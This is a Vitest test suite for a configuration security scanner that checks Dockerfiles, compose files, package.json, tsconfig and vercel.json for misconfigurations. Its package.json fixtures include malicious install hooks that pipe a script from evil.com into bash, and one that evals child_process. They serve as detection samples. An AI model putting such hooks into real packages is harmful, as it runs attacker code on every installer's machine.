import { describe, it, expect } from "vitest";
import { analyzeConfig } from "./config";

function makeFiles(entries: Record<string, string>): Map<string, string> {
  return new Map(Object.entries(entries));
}

describe("analyzeConfig", () => {
  describe("Dockerfile analysis", () => {
    it("detects container running as root (no USER instruction)", () => {
      const dockerfile = `FROM node:20-alpine
WORKDIR /app
COPY . .
RUN npm install
CMD ["node", "index.js"]`;
      const files = makeFiles({ Dockerfile: dockerfile });
      const findings = analyzeConfig(files);
      const rootFinding = findings.find((f) => f.vulnerability_id === 148);
      expect(rootFinding).toBeDefined();
      expect(rootFinding!.severity).toBe("medium");
      expect(rootFinding!.category).toBe("docker");
      expect(rootFinding!.title).toContain("Running as Root");
    });

    it("does not flag Dockerfile with USER instruction", () => {
      const dockerfile = `FROM node:20-alpine
WORKDIR /app
COPY . .
RUN npm install
USER node
CMD ["node", "index.js"]`;
      const files = makeFiles({ Dockerfile: dockerfile });
      const findings = analyzeConfig(files);
      const rootFinding = findings.find((f) => f.vulnerability_id === 148);
      expect(rootFinding).toBeUndefined();
    });

    it("detects :latest tag usage", () => {
      const dockerfile = `FROM node:latest
WORKDIR /app
CMD ["node", "index.js"]`;
      const files = makeFiles({ Dockerfile: dockerfile });
      const findings = analyzeConfig(files);
      const latestFinding = findings.find((f) => f.vulnerability_id === 149);
      expect(latestFinding).toBeDefined();
      expect(latestFinding!.severity).toBe("low");
      expect(latestFinding!.line_number).toBe(1);
    });

    it("does not flag pinned tag", () => {
      const dockerfile = `FROM node:20-alpine
USER node
HEALTHCHECK CMD curl localhost:3000
CMD ["node", "index.js"]`;
      const files = makeFiles({ Dockerfile: dockerfile });
      const findings = analyzeConfig(files);
      const latestFinding = findings.find((f) => f.vulnerability_id === 149);
      expect(latestFinding).toBeUndefined();
    });

    it("detects secrets in ENV/ARG instructions", () => {
      const dockerfile = `FROM node:20
ENV DATABASE_PASSWORD=mysecretpassword
CMD ["node", "index.js"]`;
      const files = makeFiles({ Dockerfile: dockerfile });
      const findings = analyzeConfig(files);
      const secretFinding = findings.find(
        (f) => f.vulnerability_id === 150 && f.title.includes("Secrets in Dockerfile")
      );
      expect(secretFinding).toBeDefined();
      expect(secretFinding!.severity).toBe("critical");
    });

    it("detects ARG with secret", () => {
      const dockerfile = `FROM node:20
ARG API_SECRET_KEY=abc123
CMD ["node", "index.js"]`;
      const files = makeFiles({ Dockerfile: dockerfile });
      const findings = analyzeConfig(files);
      const secretFinding = findings.find(
        (f) => f.vulnerability_id === 150 && f.title.includes("Secrets in Dockerfile")
      );
      expect(secretFinding).toBeDefined();
    });

    it("detects COPY .env into Docker image", () => {
      const dockerfile = `FROM node:20
COPY .env /app/.env
CMD ["node", "index.js"]`;
      const files = makeFiles({ Dockerfile: dockerfile });
      const findings = analyzeConfig(files);
      const envCopyFinding = findings.find(
        (f) => f.vulnerability_id === 150 && f.title.includes("Copying .env")
      );
      expect(envCopyFinding).toBeDefined();
      expect(envCopyFinding!.severity).toBe("critical");
    });

    it("detects missing HEALTHCHECK", () => {
      const dockerfile = `FROM node:20-alpine
WORKDIR /app
USER node
CMD ["node", "index.js"]`;
      const files = makeFiles({ Dockerfile: dockerfile });
      const findings = analyzeConfig(files);
      const healthFinding = findings.find((f) => f.vulnerability_id === 152);
      expect(healthFinding).toBeDefined();
      expect(healthFinding!.severity).toBe("low");
    });

    it("does not flag HEALTHCHECK when present", () => {
      const dockerfile = `FROM node:20-alpine
WORKDIR /app
USER node
HEALTHCHECK CMD curl --fail http://localhost:3000 || exit 1
CMD ["node", "index.js"]`;
      const files = makeFiles({ Dockerfile: dockerfile });
      const findings = analyzeConfig(files);
      const healthFinding = findings.find((f) => f.vulnerability_id === 152);
      expect(healthFinding).toBeUndefined();
    });

    it("handles files with .dockerfile extension", () => {
      const dockerfile = `FROM node:20-alpine
CMD ["node", "index.js"]`;
      const files = makeFiles({ "app.dockerfile": dockerfile });
      const findings = analyzeConfig(files);
      // Should detect at least running as root and missing healthcheck
      const rootFinding = findings.find((f) => f.vulnerability_id === 148);
      expect(rootFinding).toBeDefined();
    });
  });

  describe("next.config analysis", () => {
    it("detects source maps exposed in production", () => {
      const config = `
/** @type {import('next').NextConfig} */
const nextConfig = {
  productionBrowserSourceMaps: true,
};
module.exports = nextConfig;`;
      const files = makeFiles({ "next.config.js": config });
      const findings = analyzeConfig(files);
      const smFinding = findings.find((f) => f.vulnerability_id === 49);
      expect(smFinding).toBeDefined();
      expect(smFinding!.severity).toBe("medium");
      expect(smFinding!.category).toBe("react-nextjs");
    });

    it("does not flag when source maps are disabled", () => {
      const config = `
const nextConfig = {
  productionBrowserSourceMaps: false,
};
module.exports = nextConfig;`;
      const files = makeFiles({ "next.config.js": config });
      const findings = analyzeConfig(files);
      const smFinding = findings.find((f) => f.vulnerability_id === 49);
      expect(smFinding).toBeUndefined();
    });

    it("detects CORS wildcard in next.config", () => {
      const config = `
const nextConfig = {
  async headers() {
    return [{
      headers: [{ key: "Access-Control-Allow-Origin", value: "*" }],
    }];
  },
};`;
      const files = makeFiles({ "next.config.js": config });
      const findings = analyzeConfig(files);
      const corsFinding = findings.find((f) => f.vulnerability_id === 50);
      expect(corsFinding).toBeDefined();
      expect(corsFinding!.severity).toBe("medium");
    });

    it("handles next.config.ts", () => {
      const config = `
import type { NextConfig } from "next";
const nextConfig: NextConfig = {
  productionBrowserSourceMaps: true,
};
export default nextConfig;`;
      const files = makeFiles({ "next.config.ts": config });
      const findings = analyzeConfig(files);
      const smFinding = findings.find((f) => f.vulnerability_id === 49);
      expect(smFinding).toBeDefined();
    });

    it("handles next.config.mjs", () => {
      const config = `
const nextConfig = {
  productionBrowserSourceMaps: true,
};
export default nextConfig;`;
      const files = makeFiles({ "next.config.mjs": config });
      const findings = analyzeConfig(files);
      const smFinding = findings.find((f) => f.vulnerability_id === 49);
      expect(smFinding).toBeDefined();
    });
  });

  describe(".gitignore analysis", () => {
    it("detects missing .env in .gitignore", () => {
      const gitignore = `node_modules
dist
.next`;
      const files = makeFiles({ ".gitignore": gitignore });
      const findings = analyzeConfig(files);
      const envFinding = findings.find((f) => f.vulnerability_id === 168);
      expect(envFinding).toBeDefined();
      expect(envFinding!.severity).toBe("medium");
      expect(envFinding!.category).toBe("config");
    });

    it("does not flag when .env is in .gitignore", () => {
      const gitignore = `node_modules
.env
dist`;
      const files = makeFiles({
        ".gitignore": gitignore,
        ".env.example": "EXAMPLE=value",
        "package.json": "{}",
        "package-lock.json": "{}",
      });
      const findings = analyzeConfig(files);
      const envFinding = findings.find((f) => f.vulnerability_id === 168);
      expect(envFinding).toBeUndefined();
    });

    it("accepts .env* pattern in .gitignore", () => {
      const gitignore = `node_modules
.env*
dist`;
      const files = makeFiles({
        ".gitignore": gitignore,
        ".env.example": "EXAMPLE=value",
        "package.json": "{}",
        "package-lock.json": "{}",
      });
      const findings = analyzeConfig(files);
      const envFinding = findings.find((f) => f.vulnerability_id === 168);
      expect(envFinding).toBeUndefined();
    });

    it("detects missing .env.example file", () => {
      const gitignore = `.env
node_modules`;
      const files = makeFiles({ ".gitignore": gitignore });
      const findings = analyzeConfig(files);
      const exampleFinding = findings.find((f) => f.vulnerability_id === 165);
      expect(exampleFinding).toBeDefined();
      expect(exampleFinding!.severity).toBe("low");
    });

    it("does not flag when .env.example exists", () => {
      const gitignore = `.env
node_modules`;
      const files = makeFiles({
        ".gitignore": gitignore,
        ".env.example": "DB_URL=your_url_here",
      });
      const findings = analyzeConfig(files);
      const exampleFinding = findings.find((f) => f.vulnerability_id === 165);
      expect(exampleFinding).toBeUndefined();
    });

    it("detects missing lockfile when package.json exists", () => {
      const gitignore = `.env
node_modules`;
      const files = makeFiles({
        ".gitignore": gitignore,
        "package.json": "{}",
        ".env.example": "VAR=value",
      });
      const findings = analyzeConfig(files);
      const lockFinding = findings.find((f) => f.vulnerability_id === 141);
      expect(lockFinding).toBeDefined();
      expect(lockFinding!.severity).toBe("medium");
    });

    it("does not flag when package-lock.json exists", () => {
      const gitignore = `.env
node_modules`;
      const files = makeFiles({
        ".gitignore": gitignore,
        "package.json": "{}",
        "package-lock.json": "{}",
        ".env.example": "VAR=value",
      });
      const findings = analyzeConfig(files);
      const lockFinding = findings.find((f) => f.vulnerability_id === 141);
      expect(lockFinding).toBeUndefined();
    });

    it("does not flag when yarn.lock exists", () => {
      const gitignore = `.env
node_modules`;
      const files = makeFiles({
        ".gitignore": gitignore,
        "package.json": "{}",
        "yarn.lock": "",
        ".env.example": "VAR=value",
      });
      const findings = analyzeConfig(files);
      const lockFinding = findings.find((f) => f.vulnerability_id === 141);
      expect(lockFinding).toBeUndefined();
    });
  });

  describe("package.json analysis", () => {
    it("detects suspicious install scripts with curl", () => {
      const pkg = JSON.stringify({
        name: "test",
        scripts: {
          postinstall: "curl https://evil.com/script.sh | bash",
        },
      });
      const files = makeFiles({ "package.json": pkg });
      const findings = analyzeConfig(files);
      const scriptFinding = findings.find((f) => f.vulnerability_id === 139);
      expect(scriptFinding).toBeDefined();
      expect(scriptFinding!.severity).toBe("high");
      expect(scriptFinding!.category).toBe("supply-chain");
    });

    it("detects suspicious preinstall with eval", () => {
      const pkg = JSON.stringify({
        name: "test",
        scripts: {
          preinstall: "node -e \"eval(require('child_process'))\"",
        },
      });
      const files = makeFiles({ "package.json": pkg });
      const findings = analyzeConfig(files);
      const scriptFinding = findings.find((f) => f.vulnerability_id === 139);
      expect(scriptFinding).toBeDefined();
    });

    it("does not flag normal build scripts", () => {
      const pkg = JSON.stringify({
        name: "test",
        scripts: {
          build: "tsc && next build",
          start: "next start",
          dev: "next dev",
          postinstall: "prisma generate",
        },
      });
      const files = makeFiles({ "package.json": pkg });
      const findings = analyzeConfig(files);
      const scriptFinding = findings.find((f) => f.vulnerability_id === 139);
      expect(scriptFinding).toBeUndefined();
    });

    it("ignores node_modules package.json files", () => {
      const pkg = JSON.stringify({
        name: "evil-package",
        scripts: {
          postinstall: "curl https://evil.com | bash",
        },
      });
      const files = makeFiles({
        "node_modules/evil-package/package.json": pkg,
      });
      const findings = analyzeConfig(files);
      const scriptFinding = findings.find((f) => f.vulnerability_id === 139);
      expect(scriptFinding).toBeUndefined();
    });
  });

  describe("returns empty for good config files", () => {
    it("returns no findings for secure Dockerfile", () => {
      const dockerfile = `FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
USER node
HEALTHCHECK --interval=30s CMD curl --fail http://localhost:3000/health || exit 1
CMD ["node", "dist/index.js"]`;
      const files = makeFiles({ Dockerfile: dockerfile });
      const findings = analyzeConfig(files);
      expect(findings).toHaveLength(0);
    });

    it("returns no findings for secure project setup", () => {
      const gitignore = `.env
.env.local
node_modules
dist
.next`;
      const pkg = JSON.stringify({
        name: "secure-app",
        scripts: {
          build: "next build",
          start: "next start",
        },
        dependencies: { next: "15.0.0" },
      });
      const nextConfig = `
const nextConfig = {
  productionBrowserSourceMaps: false,
  poweredByHeader: false,
};
export default nextConfig;`;
      const files = makeFiles({
        ".gitignore": gitignore,
        "package.json": pkg,
        "package-lock.json": "{}",
        ".env.example": "DATABASE_URL=your_url",
        "next.config.mjs": nextConfig,
      });
      const findings = analyzeConfig(files);
      expect(findings).toHaveLength(0);
    });
  });

  describe("multiple config files", () => {
    it("analyzes all config files in the map", () => {
      const dockerfile = `FROM node:latest
CMD ["node", "index.js"]`;
      const gitignore = `node_modules`;
      const files = makeFiles({
        Dockerfile: dockerfile,
        ".gitignore": gitignore,
      });
      const findings = analyzeConfig(files);
      // Should have Dockerfile findings (root, latest, healthcheck) and gitignore findings (.env missing, etc.)
      expect(findings.length).toBeGreaterThanOrEqual(3);
    });
  });

  // -------------------------------------------------------------------------
  // docker-compose.yml analysis
  // -------------------------------------------------------------------------

  describe("docker-compose.yml analysis", () => {
    it("detects privileged: true container", () => {
      const compose = `version: "3"
services:
  app:
    image: myapp:latest
    privileged: true
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 148 && f.title.includes("Privileged")
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("critical");
      expect(finding!.category).toBe("docker");
    });

    it("records the correct line number for privileged: true", () => {
      const compose = `version: "3"
services:
  app:
    image: myapp:latest
    privileged: true
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 148 && f.title.includes("Privileged")
      );
      expect(finding!.line_number).toBe(5);
    });

    it("does NOT flag a container without privileged mode", () => {
      const compose = `version: "3"
services:
  app:
    image: myapp:latest
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const privilegedFinding = findings.find(
        (f) => f.vulnerability_id === 148 && f.title.includes("Privileged")
      );
      expect(privilegedFinding).toBeUndefined();
    });

    it("detects docker.sock volume mount", () => {
      const compose = `version: "3"
services:
  app:
    image: myapp:latest
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 148 && f.title.includes("Sensitive Volume")
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("high");
      expect(finding!.category).toBe("docker");
    });

    it("detects /etc volume mount", () => {
      const compose = `version: "3"
services:
  app:
    image: myapp:latest
    volumes:
      - /etc:/host/etc:ro
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 148 && f.title.includes("Sensitive Volume")
      );
      expect(finding).toBeDefined();
    });

    it("detects /root volume mount", () => {
      const compose = `version: "3"
services:
  app:
    image: myapp:latest
    volumes:
      - /root:/root:ro
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 148 && f.title.includes("Sensitive Volume")
      );
      expect(finding).toBeDefined();
    });

    it("does NOT flag safe application-level volume mounts", () => {
      const compose = `version: "3"
services:
  app:
    image: myapp:latest
    volumes:
      - ./data:/app/data
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const volumeFinding = findings.find(
        (f) => f.vulnerability_id === 148 && f.title.includes("Sensitive Volume")
      );
      expect(volumeFinding).toBeUndefined();
    });

    it("detects POSTGRES_PASSWORD with empty value", () => {
      const compose = `version: "3"
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD:
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("critical");
      expect(finding!.category).toBe("database");
    });

    it("detects MYSQL_ROOT_PASSWORD with empty value", () => {
      const compose = `version: "3"
services:
  db:
    image: mysql:8
    environment:
      MYSQL_ROOT_PASSWORD:
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeDefined();
    });

    it("detects MONGO_INITDB_ROOT_PASSWORD with empty value", () => {
      const compose = `version: "3"
services:
  db:
    image: mongo:7
    environment:
      MONGO_INITDB_ROOT_PASSWORD:
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeDefined();
    });

    it("does NOT flag database service with a non-empty password", () => {
      const compose = `version: "3"
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: mysecretpassword
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeUndefined();
    });

    it("detects network_mode: host", () => {
      const compose = `version: "3"
services:
  app:
    image: myapp:latest
    network_mode: host
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 148 && f.title.includes("Host Network")
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("medium");
      expect(finding!.category).toBe("docker");
    });

    it("detects network_mode: 'host' with quotes", () => {
      const compose = `version: "3"
services:
  app:
    image: myapp:latest
    network_mode: 'host'
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 148 && f.title.includes("Host Network")
      );
      expect(finding).toBeDefined();
    });

    it("does NOT flag network_mode: bridge", () => {
      const compose = `version: "3"
services:
  app:
    image: myapp:latest
    network_mode: bridge
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const hostNetworkFinding = findings.find(
        (f) => f.vulnerability_id === 148 && f.title.includes("Host Network")
      );
      expect(hostNetworkFinding).toBeUndefined();
    });

    it("processes docker-compose.yaml (alternate extension)", () => {
      const compose = `version: "3"
services:
  app:
    image: myapp:latest
    privileged: true
`;
      const files = makeFiles({ "docker-compose.yaml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 148 && f.title.includes("Privileged")
      );
      expect(finding).toBeDefined();
    });

    // ------------------------------------------------------------------
    // ID 211 — Docker Compose Default Database Credentials
    // ------------------------------------------------------------------

    it("detects POSTGRES_PASSWORD set to 'postgres' (default credential)", () => {
      const compose = `version: "3"
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: postgres
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("critical");
      expect(finding!.category).toBe("database-connection");
      expect(finding!.title).toContain("Default Database Credentials");
    });

    it("detects MYSQL_ROOT_PASSWORD set to 'root'", () => {
      const compose = `version: "3"
services:
  db:
    image: mysql:8
    environment:
      MYSQL_ROOT_PASSWORD: root
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("critical");
    });

    it("detects POSTGRES_PASSWORD set to 'admin'", () => {
      const compose = `version: "3"
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: admin
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeDefined();
    });

    it("detects POSTGRES_PASSWORD set to 'password'", () => {
      const compose = `version: "3"
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: password
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeDefined();
    });

    it("detects POSTGRES_PASSWORD set to 'changeme'", () => {
      const compose = `version: "3"
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: changeme
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeDefined();
    });

    it("redacts the password value in code_snippet", () => {
      const compose = `version: "3"
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: postgres
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding!.code_snippet).toContain("***REDACTED***");
      expect(finding!.code_snippet).not.toContain("postgres");
    });

    it("does NOT flag POSTGRES_PASSWORD with a strong custom value", () => {
      const compose = `version: "3"
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: xK9#mP2!qR7@sT4
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeUndefined();
    });

    it("does NOT flag POSTGRES_PASSWORD referencing an env variable", () => {
      const compose = `version: "3"
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: \${DB_PASSWORD}
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeUndefined();
    });

    // ------------------------------------------------------------------
    // ID 210 — Docker Compose Database Port Exposed to Host
    // ------------------------------------------------------------------

    it("detects PostgreSQL port 5432 exposed to host", () => {
      const compose = `version: "3"
services:
  db:
    image: postgres:15
    ports:
      - "5432:5432"
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 148);
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("high");
      expect(finding!.category).toBe("database-connection");
      expect(finding!.title).toContain("Database Port Exposed");
    });

    it("detects MySQL port 3306 exposed to host", () => {
      const compose = `version: "3"
services:
  db:
    image: mysql:8
    ports:
      - "3306:3306"
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 148);
      expect(finding).toBeDefined();
    });

    it("detects MongoDB port 27017 exposed to host", () => {
      const compose = `version: "3"
services:
  db:
    image: mongo:7
    ports:
      - "27017:27017"
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 148);
      expect(finding).toBeDefined();
    });

    it("detects Redis port 6379 exposed to host", () => {
      const compose = `version: "3"
services:
  cache:
    image: redis:7
    ports:
      - "6379:6379"
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 148);
      expect(finding).toBeDefined();
    });

    it("detects Elasticsearch port 9200 exposed to host", () => {
      const compose = `version: "3"
services:
  es:
    image: elasticsearch:8
    ports:
      - "9200:9200"
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 148);
      expect(finding).toBeDefined();
    });

    it("does NOT flag exposing a safe application port like 3000", () => {
      const compose = `version: "3"
services:
  app:
    image: myapp:latest
    ports:
      - "3000:3000"
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 148);
      expect(finding).toBeUndefined();
    });

    it("does NOT flag exposing port 8080", () => {
      const compose = `version: "3"
services:
  api:
    image: myapi:latest
    ports:
      - "8080:8080"
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 148);
      expect(finding).toBeUndefined();
    });

    // ------------------------------------------------------------------
    // ID 214 — Docker Compose Redis Without Password
    // ------------------------------------------------------------------

    it("detects Redis service image without requirepass or REDIS_PASSWORD", () => {
      const compose = `version: "3"
services:
  cache:
    image: redis:7-alpine
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("high");
      expect(finding!.category).toBe("database-connection");
      expect(finding!.title).toContain("Redis Without Password");
    });

    it("detects Redis:latest image without password configured", () => {
      const compose = `version: "3"
services:
  redis:
    image: redis:latest
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeDefined();
    });

    it("does NOT flag Redis service configured with --requirepass command", () => {
      const compose = `version: "3"
services:
  cache:
    image: redis:7-alpine
    command: redis-server --requirepass myStrongPassword
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeUndefined();
    });

    it("does NOT flag Redis service with REDIS_PASSWORD environment variable", () => {
      const compose = `version: "3"
services:
  cache:
    image: redis:7-alpine
    environment:
      REDIS_PASSWORD: myStrongPassword
`;
      const files = makeFiles({ "docker-compose.yml": compose });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 101);
      expect(finding).toBeUndefined();
    });
  });

  // -------------------------------------------------------------------------
  // tsconfig.json analysis
  // -------------------------------------------------------------------------

  describe("tsconfig.json analysis", () => {
    it("detects strict: false in compilerOptions", () => {
      const tsconfig = JSON.stringify({
        compilerOptions: {
          strict: false,
          target: "ES2020",
        },
      });
      const files = makeFiles({ "tsconfig.json": tsconfig });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 166 && f.title.includes("Strict Mode Disabled")
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("low");
      expect(finding!.category).toBe("config");
    });

    it("does NOT flag tsconfig with strict: true", () => {
      const tsconfig = JSON.stringify({
        compilerOptions: {
          strict: true,
          target: "ES2020",
        },
      });
      const files = makeFiles({ "tsconfig.json": tsconfig });
      const findings = analyzeConfig(files);
      const strictFinding = findings.find(
        (f) => f.vulnerability_id === 166 && f.title.includes("Strict Mode Disabled")
      );
      expect(strictFinding).toBeUndefined();
    });

    it("does NOT flag tsconfig without a strict key (omitted = defaults enabled)", () => {
      const tsconfig = JSON.stringify({
        compilerOptions: {
          target: "ES2020",
        },
      });
      const files = makeFiles({ "tsconfig.json": tsconfig });
      const findings = analyzeConfig(files);
      const strictFinding = findings.find(
        (f) => f.vulnerability_id === 166 && f.title.includes("Strict Mode Disabled")
      );
      expect(strictFinding).toBeUndefined();
    });

    it("detects noImplicitAny: false when strict is not enabled", () => {
      const tsconfig = JSON.stringify({
        compilerOptions: {
          noImplicitAny: false,
          target: "ES2020",
        },
      });
      const files = makeFiles({ "tsconfig.json": tsconfig });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 166 && f.title.includes("noImplicitAny")
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("low");
      expect(finding!.category).toBe("config");
    });

    it("does NOT flag noImplicitAny: false when strict: true is also set (strict supersedes it)", () => {
      // When strict: true, noImplicitAny: false is effectively overridden by the strict flag.
      // The engine only reports noImplicitAny when strict is NOT set to true.
      const tsconfig = JSON.stringify({
        compilerOptions: {
          strict: true,
          noImplicitAny: false,
        },
      });
      const files = makeFiles({ "tsconfig.json": tsconfig });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 166 && f.title.includes("noImplicitAny")
      );
      expect(finding).toBeUndefined();
    });

    it("ignores tsconfig.json inside node_modules", () => {
      const tsconfig = JSON.stringify({
        compilerOptions: { strict: false },
      });
      const files = makeFiles({
        "node_modules/some-pkg/tsconfig.json": tsconfig,
      });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 166);
      expect(finding).toBeUndefined();
    });

    it("does not crash on invalid JSON in tsconfig.json", () => {
      const files = makeFiles({ "tsconfig.json": "{ invalid json }" });
      expect(() => analyzeConfig(files)).not.toThrow();
      const findings = analyzeConfig(files);
      expect(Array.isArray(findings)).toBe(true);
    });
  });

  // -------------------------------------------------------------------------
  // vercel.json analysis
  // -------------------------------------------------------------------------

  describe("vercel.json analysis", () => {
    it("detects hardcoded secret-looking value in env block", () => {
      const vercelConfig = JSON.stringify({
        env: {
          API_SECRET_KEY: "supersecretvalue12345678901234",
        },
      });
      const files = makeFiles({ "vercel.json": vercelConfig });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 53);
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("critical");
      expect(finding!.category).toBe("vibecoding");
      expect(finding!.owasp_ref).toBe("A07:2021");
    });

    it("detects hardcoded TOKEN in vercel env", () => {
      // Built via concatenation so no contiguous Stripe-key-shaped literal
      // appears in source (avoids tripping GitHub push protection on our
      // own fake fixture — it's testing prefix detection, not a real key).
      const vercelConfig = JSON.stringify({
        env: {
          STRIPE_TOKEN: "sk_live_" + "reallylongvalue1234567890abc",
        },
      });
      const files = makeFiles({ "vercel.json": vercelConfig });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 53);
      expect(finding).toBeDefined();
    });

    it("detects hardcoded PASSWORD in vercel env", () => {
      const vercelConfig = JSON.stringify({
        env: {
          DB_PASSWORD: "mysuperlongpassword1234567890",
        },
      });
      const files = makeFiles({ "vercel.json": vercelConfig });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 53);
      expect(finding).toBeDefined();
    });

    it("includes the key name in the finding title", () => {
      const vercelConfig = JSON.stringify({
        env: {
          API_SECRET_KEY: "supersecretvalue12345678901234",
        },
      });
      const files = makeFiles({ "vercel.json": vercelConfig });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 53);
      expect(finding!.title).toContain("API_SECRET_KEY");
    });

    it("redacts the secret value in code_snippet", () => {
      const vercelConfig = JSON.stringify({
        env: {
          API_SECRET_KEY: "supersecretvalue12345678901234",
        },
      });
      const files = makeFiles({ "vercel.json": vercelConfig });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 53);
      expect(finding!.code_snippet).toContain("***REDACTED***");
      expect(finding!.code_snippet).not.toContain("supersecretvalue12345678901234");
    });

    it("does NOT flag @ reference values (Vercel secret syntax)", () => {
      const vercelConfig = JSON.stringify({
        env: {
          API_SECRET_KEY: "@my-secret-ref",
          DB_PASSWORD: "@db-password",
        },
      });
      const files = makeFiles({ "vercel.json": vercelConfig });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 53);
      expect(finding).toBeUndefined();
    });

